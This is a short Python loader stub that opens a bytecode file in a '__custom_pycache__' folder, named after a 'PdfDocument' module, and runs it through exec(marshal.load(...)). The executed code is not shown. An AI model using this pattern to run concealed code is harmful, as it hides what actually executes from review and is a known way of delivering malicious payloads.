
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'PdfDocument_e655ec0f10cf479fa66c83d7810ccacd.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
